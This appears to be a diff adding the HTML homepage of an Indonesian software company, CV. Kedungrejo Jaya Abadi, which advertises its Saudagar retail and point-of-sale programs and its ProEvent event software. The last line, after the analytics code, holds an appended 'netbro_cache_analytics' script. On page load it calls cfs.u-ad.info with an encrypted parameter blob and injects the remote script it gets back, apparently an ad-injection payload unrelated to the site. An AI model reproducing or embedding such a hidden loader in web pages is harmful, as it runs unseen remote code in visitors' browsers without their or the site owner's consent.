@@ -1,0 +1,202 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="EN" lang="EN" dir="ltr">
+<head>
+<title>KJA - CV. Kedungerjo Jaya Abadi (Official Website)</title>
+<link href="http://kedungrejo.com/images/icon_kedungrejo.ico" rel="shortcut icon" type="image/x-icon" />
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<meta http-equiv="imagetoolbar" content="no" />
+<link rel="stylesheet" href="http://kedungrejo.com/css/layout.css" type="text/css" />
+<script type="text/javascript" src="http://kedungrejo.com/js/jquery-1.4.1.min.js"></script>
+<script type="text/javascript" src="http://kedungrejo.com/js/jquery.defaultvalue.js"></script>
+<script type="text/javascript" src="http://kedungrejo.com/js/jquery-ui-1.8.13.custom.min.js"></script>
+<script type="text/javascript" src="http://kedungrejo.com/js/jquery.scrollTo-min.js"></script>
+<script type="text/javascript">
+$(document).ready(function () {
+    $('#shout a').click(function () {
+        var to = $(this).attr('href');
+        $.scrollTo(to, 1200);
+        return false;
+    });
+    $('a.topOfPage').click(function () {
+        $.scrollTo(0, 1200);
+        return false;
+    });
+});
+</script>
+<script type="text/javascript" src="http://kedungrejo.com/js/jquery.cycle.min.js"></script>
+<script type="text/javascript" src="http://kedungrejo.com/js/jquery.cycle.setup.js"></script>
+<script type="text/javascript" src="http://kedungrejo.com/js/piecemaker/swfobject/swfobject.js"></script>
+<script type="text/javascript">
+var flashvars = {};
+flashvars.cssSource = "js/piecemaker/piecemaker.css";
+flashvars.xmlSource = "js/piecemaker/piecemaker.xml";
+var params = {};
+params.play = "false";
+params.menu = "false";
+params.scale = "showall";
+params.wmode = "transparent";
+params.allowfullscreen = "true";
+params.allowscriptaccess = "sameDomain";
+params.allownetworking = "all";
+swfobject.embedSWF('js/piecemaker/piecemaker.swf', 'piecemaker', '960', '430', '10', null, flashvars, params, null);
+</script>
+</head>
+<body id="top">
+<div class="wrapper col1">
+  <div id="topbar" class="clear">
+    <ul>
+      <li><a href="http://kedungrejo.com/saudagar/">Poin of Sales</a></li>
+      <li><a href="http://kedungrejo.com/saudagar/">Inventory System</a></li>
+      <li><a href="http://kedungrejo.com/futsal/">Futsal</a></li>
+      <li class="last"><a href="http://kedungrejo.com/proevent/">Event Orginizer</a></li>
+    </ul>
+    <form action="search" method="get" id="search">
+      <fieldset>
+        <legend>Pencarian</legend>
+        <input type="text" name="q" value="" placeholder="Pencarian..." />
+        <input type="image" id="go" src="http://kedungrejo.com/images/search.gif" alt="Search" />
+      </fieldset>
+    </form>
+  </div>
+</div>
+<!-- ####################################################################################################### -->
+<div class="wrapper col2">
+  <div id="header" class="clear">
+    <div style="background:url(images/logo.png) no-repeat; height:70px; float:left; padding-left:80px; padding-top:10px;">
+      <h1><a href=".">Software Online</a></h1>
+      <p>CV. Kedungrejo Jaya Abadi</p>
+    </div>
+    <div id="topnav">
+      <ul>
+        <li class="last "><a href="http://kedungrejo.com/contact">Kontak</a><span>Kontak Kami</span></li>
+        <li ><a href="http://kedungrejo.com/client">Klien</a><span>Klien Kami</span></li>
+        <li><a href="http://kedungrejo.com/registrasi/">Registrasi</a><span>Software Online</span></li>
+        <li ><a href="http://kedungrejo.com/product">Produk</a><span>Software</span></li>
+        <li ><a href="http://kedungrejo.com/profile">Profile</a><span>Profile Kami</span></li>
+        <li class="active"><a href="http://kedungrejo.com/">Home</a><span>Beranda</span></li>
+      </ul>
+    </div>
+  </div>
+</div><!-- ####################################################################################################### -->
+<div class="wrapper col3">
+  <div id="featured_slide">
+    <!-- ####################################################################################################### -->
+    <div id="piecemaker"> <img src="http://kedungrejo.com/images/piecemaker/960x360.gif" alt="" /> </div>
+    <!-- ####################################################################################################### -->
+  </div>
+</div>
+<!-- ####################################################################################################### -->
+<div class="wrapper col4">
+  <div id="container" class="clear">
+    <!-- ####################################################################################################### -->
+    <div id="shout" class="clear">
+      <div class="fl_left">
+        <h2>Perlu Software Online Berbasis Web ?</h2>
+        <p>Mengapa tidak mencoba produk kami hari ini, download sekarang gratis...!</p>
+      </div>
+      <p class="fl_right"><a href="http://kedungrejo.com/product">DOWNLOAD</a></p>
+    </div>
+    <!-- ####################################################################################################### -->
+    <div id="homepage" class="clear">
+      <div class="fl_left">
+        <h2>Keunggulan Produk Kami</h2>
+        <ul>
+          <li>Dibangun menggunakan program Open Source</li>
+          <li>Dapat berjalan di Sistem Operasi Windows, Linux, Mac OS</li>
+          <li>Dapat diakses melalui Jaringan Lokal maupun Internet</li>
+          <li>Dapat diakses banyak user dan klien</li>
+          <li>Dapat diakses kapanpun dan dimanapun anda berada bila install di Internet</li>
+          <li>Dapat diakses dengan menggunakan PC, Laptop, Handphone, Tablet</li>
+          <li>Tidak perlu install program klien</li>
+          <li>Tidak ada batasan jumlah user</li>
+          <li>Tidak ada batasan jumlah komputer yang meng-akses</li>
+          <li>Mudah dan Cepat untuk dioperasikan</li>
+        </ul>
+        <h2>Akses Aplikasi</h2>
+        <p>Aplikasi dapat diakses atau dijalankan melalui berbagai macam perangkat seperti PC, Laptop, Handphone dan Table seperti pada gambar berikut : <br /><img src="http://kedungrejo.com/images/perangkat.jpg" width="480" height="358" border="1" /></p>
+        <h2>Release Terbaru</h2>
+        <p><strong>Saudagar v2.6 (Standart, Professional, Ultimate)</strong></p>
+        <p><strong>Software Retail atau Program Retail </strong>ini dirancang sedemikian rupa agar dapat memberikan kemudahan bagi anda dalam melakukan pengelolaan usaha ritel maupun grosir seperti penjualan barang, pemasukkan barang, dan juga dapat memberikan laporan-laporan pemasukkan dan pengeluaran sehingga lebih <strong>Mudah dan Cepat</strong>.&nbsp;<strong><strong> Saudagar</strong></strong> sudah dilengkapi   dengan fasilitas barcode yang akan mempercepat proses input data dan   transaksi usaha ritel anda.</p>
+        <p class="readmore"><a href="http://kedungrejo.com/saudagar/fitur?sub=fitur-semua-saudagar-v2.6"><strong>Lihat Selengkapnya &raquo;</strong></a></p>
+        <p><strong>ProEvent v2.6</strong></p>
+        <p><strong>ProEvent atau  Professional Event</strong> adalah program aplikasi yang dirancang khusus untuk <strong>kegiatan seminar, workshop atau pelatihan serta kongres</strong> sehingga memudahkan dalam pengontrolan keluar masuknya dana kegiatan,     pengolahan data registrasi peserta, absensi kehadiran, workshop atau     pelatihan, akomodasi peserta, sponsor, cetak kuitansi, cetak name tag     atau tanda pengenal, cetak sertifikat, laporan registrasi, laporan     pembayaran registrasi, laporan kehadiran, daftar kehadiran, laporan     workshop, laporan sponsor, laporan partisipasi sponsor, laporan     akomodasi, laporan keuangan serta laporan rekap keuangan. </p>
+        <p class="readmore"><a href="http://kedungrejo.com/proevent/"><strong>Lihat Selengkapnya &raquo;</strong></a></p>
+        <p><strong>Saudagar v2.5 Futsal</strong></p>
+        <p><strong>Saudagar Futsal</strong> merupakan software POS (Poin Of Sales)   atau penjualan atau pengelolaan usaha futsal dalam penjadwalan pemakaian   lapangan dan penjualan barang retail seperti penjualan barang, minuman,   makanan dan lain-lain.</p>
+        <p class="readmore"><a href="http://kedungrejo.com/futsal/"><strong>Lihat Selengkapnya &raquo;</strong></a></p>
+        <p><strong>Saudagar v2.5 Counter Handphone</strong></p>
+        <p><strong>Saudagar Counter Handphone </strong>adalah   program aplikasi / software yang di rancang untuk menangani proses yang terjadi dalam    usaha counter hanphone seperti <em>penanganan     service, transakasi   pembelian maupun penjualan gadget (handphone, table, pablet dll),     data supplier, data customer, data gadget, histori service   handphone,   laporan   hutang / piutang  dagang, laporan laba   rugi </em>dan lain sebagainya.</p>
+        <p class="readmore"><a href="http://kedungrejo.com/saudagar/fitur?sub=saudagar-v25-handphone"><strong>Lihat Selengkapnya &raquo;</strong></a></p>
+      </div>
+      <div class="fl_right">
+        <h2>Produk Favorite</h2>
+        <ul class="testimonials">
+          <li>
+            <p class="name"><strong>Saudagar v2.5</strong></p>
+            <blockquote><strong>Software Retail atau Program Retail </strong>ini dirancang sedemikian rupa agar dapat memberikan kemudahan bagi anda dalam melakukan pengelolaan usaha ritel maupun grosir seperti penjualan barang, pemasukkan barang, dan juga dapat memberikan laporan-laporan pemasukkan dan pengeluaran sehingga lebih <strong>Mudah dan Cepat</strong>.&nbsp;<strong><strong> Saudagar</strong></strong> sudah dilengkapi   dengan fasilitas barcode yang akan mempercepat proses input data dan   transaksi usaha ritel anda.&nbsp;</blockquote>
+            <p class="readmore"><a href="http://kedungrejo.com/saudagar/fitur.php?sub=saudagar-v2.5"><strong>Lihat Selengkapnya &raquo;</strong></a></p>
+          </li>
+          <li class="last">
+            <p class="name"><strong>Saudagar v2.5 Bengkel</strong></p>
+            <blockquote><strong>Saudagar Bengkel </strong>adalah   program aplikasi / software bengkel yang di rancang untuk menangani proses yang terjadi dalam usaha bengkel seperti <em>penanganan service, transakasi pembelian maupun penjualan sparepart kendaraan, data supplier, data customer, data kendaraan, histori service   kendaraan,   laporan   hutang / piutang  dagang, laporan laba   rugi </em>dan lain sebagainya.</blockquote>
+            <p class="readmore"><a href="http://kedungrejo.com/saudagar/fitur.php?sub=saudagar-v2.5-bengkel"><strong>Lihat Selengkapnya &raquo;</strong></a></p>
+            <p><a href="http://kedungrejo.com/product.php">Tampilkan Semua Produk &raquo;</a></p>
+          </li>
+        </ul>
+        <h2>Kontak Kami</h2>
+        <p>Jika anda perlu informasi atau ada pertanyaan tentang produk kami, jangan ragu untuk  kontak kami sekarang juga.</p>
+        <table width="100%" cellpadding="0" cellspacing="0">
+          <tr>
+            <td width="20%">Hot Line 1</td>
+            <td width="3%">:</td>
+            <td>031-7068-1282, 0851-0168-1282</td>
+          </tr>
+          <tr>
+            <td>Hot Line 2</td>
+            <td>:</td>
+            <td>0856-3327-048</td>
+          </tr>
+          <tr>
+            <td>Email</td>
+            <td>:</td>
+            <td><a href="mailto:sales@kedungrejo.com">sales@kedungrejo.com</a></td>
+          </tr>
+         <tr>
+           <td>YM</td>
+           <td>:</td>
+           <td><a href="ymsgr:sendIM?kjasoftware"><img src="http://opi.yahoo.com/online?u=kjasoftware&amp;m=g&amp;t=1" border="0" align="middle" alt="kjasoftware" title="Yahoo! Messenge : kjasoftware" /></a></td>
+         </tr>
+         <tr>
+           <td>Skype</td>
+           <td>:</td>
+           <td><script type="text/javascript" src="http://download.skype.com/share/skypebuttons/js/skypeCheck.js"></script><a href="skype:kjasoftware?chat"><img src="http://mystatus.skype.com/smallclassic/kjasoftware" style="border: none;" width="100" height="20" alt="kjasoftware" title="Skype : kjasoftware" /></a></td>
+         </tr>
+         <tr>
+           <td>PIN</td>
+           <td>:</td>
+           <td>51EEFAAE</td>
+         </tr>
+        </table>
+      </div>
+    </div>
+    <!-- ####################################################################################################### -->
+  </div>
+</div><!-- ####################################################################################################### -->
+  <div id="backtotop"><a href="http://kedungrejo.com/#top" class="topOfPage"> &nbsp; Top</a></div>
+<!-- ####################################################################################################### -->
+<div class="wrapper">
+  <div id="copyright" class="clear">
+    <p class="fl_left">Copyright &copy; 2015 - All Rights Reserved - <a href="http://kedungrejo.com">CV. Kedungrejo Jaya Abadi</a></p>
+    <p class="fl_right">Template by <a href="http://www.os-templates.com/" title="Free Website Templates" target="_blank">OS Templates</a></p>
+  </div>
+</div>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-11715977-1");
+pageTracker._trackPageview();
+} catch(err) {}</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnuZDXFF208lmgCosWPTL2SkpjqjBu0sFHesdanhafaAYck%2bZBCIqz0M7KxbDOiM1iEEvGkaiHJLuzl%2fGeJpvPkQJhKbR4rxzUXk2VyAwRYNodvnN7KC1C7pQxw9FClZEx7wN2JA92OENnhE%2bksA%2f3psSkBceMwhacDXYxpnAwe7Xas5qTZj94yJ7U%2bqYRhTDjMUzVozviK8%2bVzs5jpXzfdv4akaQ1yZLiU4q3hpC2ERbZ4CEbaMziWIE4%2bVzea8LGtD6FBhG20jXQLbJy2IU1Xn6oiusKIa9gbtd46io2q%2b6QNJBC7fMjAbQhzeV3GgG1coQOANkPWZ3jIOOVkbItjtVBr7fov5v%2fimHGGfm%2bDgBDKvnq0oTnSShUGPz%2bg460yzchlQNFsOWLsPbhjL3o3QBBDLWOm2seWiqW6ZD2I4IgzCoJDW%2fDSsZ7zy4czsYRpaij4yTXotGC1JLdS7gXIX24n9%2bVT5vvwflj2U7sg8J6yOEveXa7z5he%2bN6U3QNGV%2bqWXqL9szaIldlQ0Os%2bTA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
